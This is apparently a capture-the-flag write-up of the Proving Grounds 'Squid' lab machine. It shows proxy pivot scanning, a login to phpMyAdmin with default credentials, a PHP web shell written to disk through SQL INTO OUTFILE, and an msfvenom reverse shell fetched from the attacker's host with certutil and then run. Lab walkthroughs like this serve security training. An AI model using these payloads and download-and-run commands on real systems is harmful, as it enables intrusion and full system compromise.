---
layout: post
title: Proving Grounds Practice Squid  
subtitle: Easy
thumbnail-img: /assets/img/squid/squid.png
tags: [PG]
---

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/squid.png)

| Name | Sorcerer |
| :------ |:--- |
| OS | Windows |
| DIFFICULTY | Easy  |

# Port Scan
Like every machine, I started with a `nmap` script to identify open ports. The first clip below highlights the `--min-rate 1000` which will perform a very rapid scan over all ports (specified by using `-p-`).
```
┌──(root㉿kali)-[~/provingGrounds/squid]
└─# nmap -p- -v --min-rate 1000 192.168.179.189 -oN nmap.scan -Pn
PORT     STATE SERVICE
3128/tcp open  squid-http
```

There was only one port open `3128`. `Nmap` thought that this was `squid-http`, but just to be sure I ran a script `-sC` and version `-sV` scan to double-check. 
```
┌──(root㉿kali)-[~/provingGrounds/squid]
└─# nmap -p 3128 192.168.179.189 -sV -sC -oN 3128.scan -Pn
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
```

# Squid-Http
The home page of this site gives an error saying that the URL is bad. I do not know much about `Squid Proxy` specifically but usually a proxy is a gateway between a user and a server. At the bottom of this page, there is a version disclosure of `SQUID (squid4.14)`. Whenever I come across a version I like to look around the internet for a potential exploit, this version however did not have one. 
![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/1.png)

The next thing I did was take a look at [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid) to see if they had any advice on testing a Squid Proxy Server. The site references a tool called `spose.py` https://github.com/aancw/spose that will abuse the proxy to scan for internal open ports.

```
┌──(root㉿kali)-[~/provingGrounds/squid/spose]
└─# python spose.py --proxy http://192.168.179.189:3128 --target 192.168.179.189 
Using proxy address http://192.168.179.189:3128
192.168.179.189 3306 seems OPEN 
192.168.179.189 8080 seems OPEN 
```

I also found a `metasploit` module that does the same thing. https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning/ The main difference between the two is the default scanned ports. `spose.py` has a wider range of ports. This tool could also be used to pivot to other machines, but since this is a CTF I just stuck to the host. 

```
msf6 auxiliary(scanner/http/squid_pivot_scanning) > options

Module options (auxiliary/scanner/http/squid_pivot_scanning):

   Name          Current Setting                                  Required  Description
   ----          ---------------                                  --------  -----------
   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE         192.168.179.189                                  yes       IPs to scan through Squid proxy
   RHOSTS        192.168.179.189                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         3128                                             yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads (max one per host)
   VHOST                                                          no        HTTP server virtual host

msf6 auxiliary(scanner/http/squid_pivot_scanning) > run

[+] [192.168.179.189] 192.168.179.189 is alive.
[+] [192.168.179.189] 192.168.179.189:8080 seems open (HTTP 200, server header: 'Apache/2.4.46 (Win64) PHP/7.3.21').
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Based on the output above there appears to be a web server on port `8080`. To reach this site I'll configure my `foxyproxy` to use the `squid` server

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/2.png)

Once enabled going to `http://192.168.179.189:8080/` gets me to the internal host's `wamp` site. `wamp` is a software stack for windows that includes a Apache web server, OpenSSL for SSL support, MySQL database ,and the PHP programming language.

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/3.png)

`phpmyadmin` is a great way to get code execution so I tried that avenue first. http://192.168.179.189:8080/phpmyadmin/ brought me to a login page and the default credentials of `root` and no password got me in! It's common to have default credentials on an internal app.

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/4.png)

I created a new database and inserted some malicious `sql` to drop a back door onto the system.

`SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:/wamp/www/backdoor.php"`

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/5.png)

Now going to `http://192.168.179.189:8080/backdoor.php?cmd=dir` gives me code execution!

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/6.png)

Next, I generated a reverse shell with `msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shell.exe`, then hosted it with `python3 -m http.server 80`. I then used my code execution to download and run the reverse shell.

`certutil.exe -urlcache -f http://192.168.49.179/shell.exe shell.exe`
![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/7.png)

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/8.png)


![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/9.png)

![squid](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/squid/10.png)

It appears that this service was running as system! This box is rooted. 
